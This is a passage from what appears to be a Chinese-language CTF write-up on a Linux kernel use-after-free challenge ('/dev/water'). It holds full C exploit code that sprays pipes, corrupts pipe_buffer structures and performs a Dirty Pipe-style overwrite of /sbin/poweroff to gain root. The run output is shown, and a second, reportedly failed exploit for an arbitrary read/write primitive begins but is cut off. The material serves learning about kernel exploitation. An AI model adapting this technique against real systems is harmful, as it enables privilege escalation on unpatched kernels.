+</span></span><span style="display:flex;"><span>  new_chunk();
+</span></span><span style="display:flex;"><span>  debug(<span style="color:#f1fa8c">&#34;write chunk data D&#34;</span>);
+</span></span><span style="display:flex;"><span>  delete_chunk();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;fill the hole&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> PIPE_SPRAY_NUMS; i <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">2</span>) {
+</span></span><span style="display:flex;"><span>    fcntl(spray_pipe_fd[i][<span style="color:#bd93f9">1</span>], F_SETPIPE_SZ, <span style="color:#bd93f9">0x1000</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">8</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;alloc pipe_buffer pages&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> PIPE_SPRAY_NUMS; i<span style="color:#ff79c6">++</span>) {
+</span></span><span style="display:flex;"><span>    write(spray_pipe_fd[i][<span style="color:#bd93f9">1</span>], <span style="color:#f1fa8c">&#34;deadbeef&#34;</span>, <span style="color:#bd93f9">0x8</span>);
+</span></span><span style="display:flex;"><span>    write(spray_pipe_fd[i][<span style="color:#bd93f9">1</span>], <span style="color:#ff79c6">&amp;</span>i, <span style="color:#ff79c6">sizeof</span>(<span style="color:#8be9fd">int</span>));
+</span></span><span style="display:flex;"><span>    write(spray_pipe_fd[i][<span style="color:#bd93f9">1</span>], <span style="color:#ff79c6">&amp;</span>i, <span style="color:#ff79c6">sizeof</span>(<span style="color:#8be9fd">int</span>));
+</span></span><span style="display:flex;"><span>    write(spray_pipe_fd[i][<span style="color:#bd93f9">1</span>], <span style="color:#ff79c6">&amp;</span>i, <span style="color:#ff79c6">sizeof</span>(<span style="color:#8be9fd">int</span>));
+</span></span><span style="display:flex;"><span>    write(spray_pipe_fd[i][<span style="color:#bd93f9">1</span>], <span style="color:#f1fa8c">&#34;deadbeef&#34;</span>, <span style="color:#bd93f9">0x8</span>);
+</span></span><span style="display:flex;"><span>    write(spray_pipe_fd[i][<span style="color:#bd93f9">1</span>], <span style="color:#f1fa8c">&#34;deadbeef&#34;</span>, <span style="color:#bd93f9">0x8</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;uaf change pipe-&gt;bufs-&gt;page&#34;</span>);
+</span></span><span style="display:flex;"><span>  edit_chunk(<span style="color:#bd93f9">0x00</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;find victim pipe&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> PIPE_SPRAY_NUMS; i<span style="color:#ff79c6">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> tags[<span style="color:#bd93f9">0x10</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> nr;
+</span></span><span style="display:flex;"><span>    memset(tags, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">sizeof</span>(tags));
+</span></span><span style="display:flex;"><span>    read(spray_pipe_fd[i][<span style="color:#bd93f9">0</span>], tags, <span style="color:#bd93f9">8</span>);
+</span></span><span style="display:flex;"><span>    read(spray_pipe_fd[i][<span style="color:#bd93f9">0</span>], <span style="color:#ff79c6">&amp;</span>nr, <span style="color:#ff79c6">sizeof</span>(<span style="color:#8be9fd">int</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>strcmp(tags, <span style="color:#f1fa8c">&#34;deadbeef&#34;</span>) <span style="color:#ff79c6">&amp;&amp;</span> nr <span style="color:#ff79c6">!=</span> i) {
+</span></span><span style="display:flex;"><span>      origin_idx <span style="color:#ff79c6">=</span> nr;
+</span></span><span style="display:flex;"><span>      victim_idx <span style="color:#ff79c6">=</span> i;
+</span></span><span style="display:flex;"><span>      log_info(<span style="color:#f1fa8c">&#34;succeed find victim: %d, origin: %d&#34;</span>, victim_idx, origin_idx);
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (victim_idx <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span> <span style="color:#ff79c6">||</span> origin_idx <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>) {
+</span></span><span style="display:flex;"><span>    err_exit(<span style="color:#f1fa8c">&#34;find idx&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">pipe_primitive</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> buffer[<span style="color:#bd93f9">0x400</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> snd_pipe_fd[SND_PIPE_SPRAY_NUMS][<span style="color:#bd93f9">2</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> target_fd;
+</span></span><span style="display:flex;"><span>  size_t snd_pipe_sz;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ((target_fd <span style="color:#ff79c6">=</span> open(target_file, O_RDONLY)) <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>) {
+</span></span><span style="display:flex;"><span>    err_exit(<span style="color:#f1fa8c">&#34;open /bin/busybox&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  snd_pipe_sz <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x1000</span> <span style="color:#ff79c6">*</span> (SND_PIPE_BUFS_SIZE <span style="color:#ff79c6">/</span> <span style="color:#ff79c6">sizeof</span>(<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_buffer</span>));
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> SND_PIPE_SPRAY_NUMS; i<span style="color:#ff79c6">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (pipe(snd_pipe_fd[i]) <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>) {
+</span></span><span style="display:flex;"><span>      err_exit(<span style="color:#f1fa8c">&#34;pipe&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;write pipe then we can read&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// ? 因为我们在find victim 写了 3 个 字符串 和 3个 sizeof(int) 导致
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  write(spray_pipe_fd[victim_idx][<span style="color:#bd93f9">1</span>], buffer, SND_PIPE_BUFS_SIZE <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">24</span> <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">3</span> <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">sizeof</span>(<span style="color:#8be9fd">int</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;free origin pipe&#34;</span>);
+</span></span><span style="display:flex;"><span>  close(spray_pipe_fd[origin_idx][<span style="color:#bd93f9">0</span>]);
+</span></span><span style="display:flex;"><span>  close(spray_pipe_fd[origin_idx][<span style="color:#bd93f9">1</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;fcntl to set the pipe in victim page&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> SND_PIPE_SPRAY_NUMS; i<span style="color:#ff79c6">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (fcntl(snd_pipe_fd[i][<span style="color:#bd93f9">1</span>], F_SETPIPE_SZ, snd_pipe_sz) <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>) {
+</span></span><span style="display:flex;"><span>      err_exit(<span style="color:#f1fa8c">&#34;failed to re-alloc pipe_buffer!&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    loff_t offset <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>    ssize_t nbytes <span style="color:#ff79c6">=</span> splice(target_fd, <span style="color:#ff79c6">&amp;</span>offset, snd_pipe_fd[i][<span style="color:#bd93f9">1</span>], <span style="color:#8be9fd;font-style:italic">NULL</span>, <span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (nbytes <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>) err_exit(<span style="color:#f1fa8c">&#34;splice() error&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// ? 还是find victim_idx 读取了 tag 和 idx 导致的指针偏移
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  read(spray_pipe_fd[victim_idx][<span style="color:#bd93f9">0</span>], buffer, SND_PIPE_BUFS_SIZE <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">8</span> <span style="color:#ff79c6">-</span> <span style="color:#ff79c6">sizeof</span>(<span style="color:#8be9fd">int</span>));
+</span></span><span style="display:flex;"><span>  read(spray_pipe_fd[victim_idx][<span style="color:#bd93f9">0</span>], <span style="color:#ff79c6">&amp;</span>info_pipe_buf, <span style="color:#ff79c6">sizeof</span>(info_pipe_buf));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ((size_t)info_pipe_buf.page <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0xffff000000000000</span> <span style="color:#ff79c6">||</span>
+</span></span><span style="display:flex;"><span>      (size_t)info_pipe_buf.ops <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0xffffffff81000000</span>) {
+</span></span><span style="display:flex;"><span>    err_exit(<span style="color:#f1fa8c">&#34;FAILED to re-hit victim page!&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;page: %#llx&#34;</span>, (size_t)info_pipe_buf.page);
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;ops: %#llx&#34;</span>, (size_t)info_pipe_buf.ops);
+</span></span><span style="display:flex;"><span>  debug(<span style="color:#f1fa8c">&#34;debug&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  info_pipe_buf.flags <span style="color:#ff79c6">|=</span> PIPE_BUF_FLAG_CAN_MERGE;
+</span></span><span style="display:flex;"><span>  info_pipe_buf.offset <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>  info_pipe_buf.len <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// 泄露信息的下一个pipe_buf
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  write(spray_pipe_fd[victim_idx][<span style="color:#bd93f9">1</span>], <span style="color:#ff79c6">&amp;</span>info_pipe_buf, <span style="color:#ff79c6">sizeof</span>(info_pipe_buf));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;dirty pipe write target file&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> SND_PIPE_SPRAY_NUMS; i<span style="color:#ff79c6">++</span>) {
+</span></span><span style="display:flex;"><span>    write(snd_pipe_fd[i][<span style="color:#bd93f9">1</span>], payload, <span style="color:#ff79c6">sizeof</span>(payload));
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  log_info(<span style="color:#f1fa8c">&#34;write ook&#34;</span>);
+</span></span><span style="display:flex;"><span>  close(target_fd);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">check</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> target_fd;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> buffer[<span style="color:#bd93f9">0x100</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ((target_fd <span style="color:#ff79c6">=</span> open(target_file, O_RDONLY)) <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>) {
+</span></span><span style="display:flex;"><span>    err_exit(<span style="color:#f1fa8c">&#34;open /bin/busybox&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  read(target_fd, buffer, <span style="color:#bd93f9">0x10</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (strstr(buffer, <span style="color:#f1fa8c">&#34;/bin/sh&#34;</span>)) {
+</span></span><span style="display:flex;"><span>    err_exit(<span style="color:#f1fa8c">&#34;do not write&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;/sbin/poweroff: %s&#34;</span>, buffer);
+</span></span><span style="display:flex;"><span>  close(target_fd);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>() {
+</span></span><span style="display:flex;"><span>  dev_fd <span style="color:#ff79c6">=</span> open(<span style="color:#f1fa8c">&#34;/dev/water&#34;</span>, O_RDWR);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (dev_fd <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>) {
+</span></span><span style="display:flex;"><span>    err_exit(<span style="color:#f1fa8c">&#34;open /dev/water&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  system(<span style="color:#f1fa8c">&#34;cp /bin/sh /tmp/sh&#34;</span>);
+</span></span><span style="display:flex;"><span>  system(<span style="color:#f1fa8c">&#34;cp /bin/cat /tmp/cat&#34;</span>);
+</span></span><span style="display:flex;"><span>  page_level_uaf();
+</span></span><span style="display:flex;"><span>  debug(<span style="color:#f1fa8c">&#34;pause after uaf&#34;</span>);
+</span></span><span style="display:flex;"><span>  pipe_primitive();
+</span></span><span style="display:flex;"><span>  debug(<span style="color:#f1fa8c">&#34;pause after dirty pipe&#34;</span>);
+</span></span><span style="display:flex;"><span>  check();
+</span></span><span style="display:flex;"><span>  debug(<span style="color:#f1fa8c">&#34;if see this, write ok&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>结果如下，成功率蛮高的。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Boot took 2.16 seconds
+</span></span><span style="display:flex;"><span>/ $ ./exp
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> spray pipe
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> change ring_size make pipe-&gt;bufs kmalloc-512
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> kmalloc-512 hole
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> new chunk <span style="color:#ff79c6">then</span> free
+</span></span><span style="display:flex;"><span>write chunk data D
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> fill the hole
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> alloc pipe_buffer pages
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> uaf change pipe-&gt;bufs-&gt;page
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> find victim pipe
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> succeed find victim: 0, origin: <span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>pause after uaf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> write pipe <span style="color:#ff79c6">then</span> we can <span style="color:#8be9fd;font-style:italic">read</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> free origin pipe
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> fcntl to <span style="color:#8be9fd;font-style:italic">set</span> the pipe in victim page
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> page: 0xffffea0000193140
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> ops: 0xffffffff82248500
+</span></span><span style="display:flex;"><span>debug
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> dirty pipe write target file
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> write ook
+</span></span><span style="display:flex;"><span>pause after dirty pipe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/sbin/poweroff: <span style="color:#6272a4">#!/tmp/sh</span>
+</span></span><span style="display:flex;"><span> /tmp/ڀ@if see this, write ok
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>   14.466663<span style="color:#ff79c6">]</span> BUG: Bad page state in process exp  pfn:07714
+</span></span><span style="display:flex;"><span>/ $ ls
+</span></span><span style="display:flex;"><span>flag<span style="color:#ff79c6">{</span>test_flag<span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>/bin/ls: line 3: syntax error: unexpected <span style="color:#f1fa8c">&#34;)&#34;</span>
+</span></span></code></pre></div><h4 id="task-struct-cred">task struct cred</h4>
+<p>二级管道，任意地址读写，也可以写 <code>modprobe_path</code>。</p>
+<p>为什么刚开始写pipe要写三个数字：因为我们要至少三次读取获得idx。</p>
+<p>我们需要使用第二次page-level-uaf，借助另外三个管道：</p>
+<ul>
+<li>位置在第二个 uaf page ： pipe1 &amp; pipe2 &amp; pipe3，其page指针全都指向第二个 uaf page 对应的 struct page 结构体。</li>
+<li>pipe1，实现任意地址读，只需要修改page指针和 offset + len 变量</li>
+<li>pipe2，修改pipe3</li>
+<li>pipe3，可以修改pipe1 &amp; pipe 2 内容</li>
+<li>只需要控制 pipe_buffer 的 page 指针、offset 和 len 就可以实现任意地址读写</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>origin ‾‾|
+</span></span><span style="display:flex;"><span>vimtim ---&gt; uaf page
+</span></span><span style="display:flex;"><span>		  +------------+
+</span></span><span style="display:flex;"><span>		  + pipe_bufsx +
+</span></span><span style="display:flex;"><span>		  +------------+
+</span></span><span style="display:flex;"><span>		  + pipe_bufsy + 
+</span></span><span style="display:flex;"><span>		  +------------+
+</span></span><span style="display:flex;"><span>		  + pipe_bufsz +
+</span></span><span style="display:flex;"><span>		  +------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>读取pipe_bufs2 获得 info_pipe_buf,然后通过 victim 写 pipe_bufs3，这里这个page
+</span></span><span style="display:flex;"><span>origin ￣|
+</span></span><span style="display:flex;"><span>vimtim ---&gt; uaf page
+</span></span><span style="display:flex;"><span>		  +------------+
+</span></span><span style="display:flex;"><span>		  + pipe_bufsx +
+</span></span><span style="display:flex;"><span>		  +------------+
+</span></span><span style="display:flex;"><span>		  + pipe_bufsy + 
+</span></span><span style="display:flex;"><span>		  +------------+
+</span></span><span style="display:flex;"><span>		  + pipe_bufsz + ‾‾‾‾‾‾‾‾‾‾|
+</span></span><span style="display:flex;"><span>		  +------------+           |
+</span></span><span style="display:flex;"><span>		  +   ...      +           |
+</span></span><span style="display:flex;"><span>		  +------------+           |
+</span></span><span style="display:flex;"><span>		  + pipe_bufsn + --------------&gt; page
+</span></span><span style="display:flex;"><span>		  +------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>找到这两个idx, 然后构造二级page-level-uaf，使用 pipe_bufs 使用这个 page
+</span></span><span style="display:flex;"><span>origin ￣|
+</span></span><span style="display:flex;"><span>vimtim ---&gt; uaf page
+</span></span><span style="display:flex;"><span>		  +------------+
+</span></span><span style="display:flex;"><span>		  + pipe_bufsx +
+</span></span><span style="display:flex;"><span>		  +------------+
+</span></span><span style="display:flex;"><span>		  + pipe_bufsy + 
+</span></span><span style="display:flex;"><span>		  +------------+
+</span></span><span style="display:flex;"><span>		  + pipe_bufsz + snd_victim‾‾‾‾‾‾‾‾‾‾|
+</span></span><span style="display:flex;"><span>		  +------------+                     |
+</span></span><span style="display:flex;"><span>		  +   ...      +                     |
+</span></span><span style="display:flex;"><span>		  +------------+                     |
+</span></span><span style="display:flex;"><span>		  + pipe_bufsn + snd_origin--------------&gt; uaf  page
+</span></span><span style="display:flex;"><span>		  +------------+                          +------------+
+</span></span><span style="display:flex;"><span>									              + pipe_bufs1 +
+</span></span><span style="display:flex;"><span>						                          +------------+
+</span></span><span style="display:flex;"><span>						                          + pipe_bufs2 + 
+</span></span><span style="display:flex;"><span>						                          +------------+
+</span></span><span style="display:flex;"><span>						                          + pipe_bufs3 +
+</span></span><span style="display:flex;"><span>						                          +------------+
+</span></span><span style="display:flex;"><span>						                          + pipe_bufs4 +
+</span></span><span style="display:flex;"><span>						                          +------------+
+</span></span><span style="display:flex;"><span>						                          +     ...    +
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>snd_victim_idx 写 0, 1, 2, <span style="color:#bd93f9">3</span> 伪造对应的 pipe_buffer page len offset，都可以读写pipe_bufs2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>最终情形
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">4</span> 向 <span style="color:#bd93f9">2</span> 里面写内容，改变 page 和 offset 和 len，就能任意地址读。
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">4</span> 向 <span style="color:#bd93f9">3</span> 里写内容，使 Y write 开始地址为 Z
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3</span> 改 4，可以一直写 X
+</span></span></code></pre></div><p>在构造第一个 page-level-uaf 中，读取内容即使找到也不能 break，否则第二次读取出错。</p>
+<p>exp 如下</p>
+<ul>
+<li>在info leak 出错，不知道为什么读取不出来内容，看了几遍也不知道哪里出问题，当局者迷吧🤡。</li>
+</ul>
+<p>找到一篇文章：<a href="https://blog.csdn.net/qq_61670993/article/details/134359694">强网拟态2023-water-ker</a>，exp可以提权，编译时显示缺少了一个括号，补上就行。</p>
+<p>如下为失败的exp。<del>没成功为什么要放上来，不能让我白写吧</del></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">#define _GNU_SOURCE
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;fcntl.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sched.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdint.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;string.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/ioctl.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/prctl.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define PIPE_SPRAY_NUMS 200
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span><span style="color:#6272a4">// kmalloc-cg-96
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">#define SND_PIPE_BUFS_SIZE 96
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span><span style="color:#6272a4">// kmalloc-cg-192
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">#define TRD_PIPE_BUFS_SIZE 192
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define log_info(fmt, ...) \
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">  dprintf(2, &#34;\033[32m[+] &#34; fmt &#34;\033[0m\n&#34;, ##__VA_ARGS__)
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">page</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_inode_info</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_buf_operations</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_buffer</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">page</span> <span style="color:#ff79c6">*</span>page;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> offset, len;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">const</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_buf_operations</span> <span style="color:#ff79c6">*</span>ops;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> flags;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> <span style="color:#ff79c6">private</span>;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">pipe_buf_operations</span> {
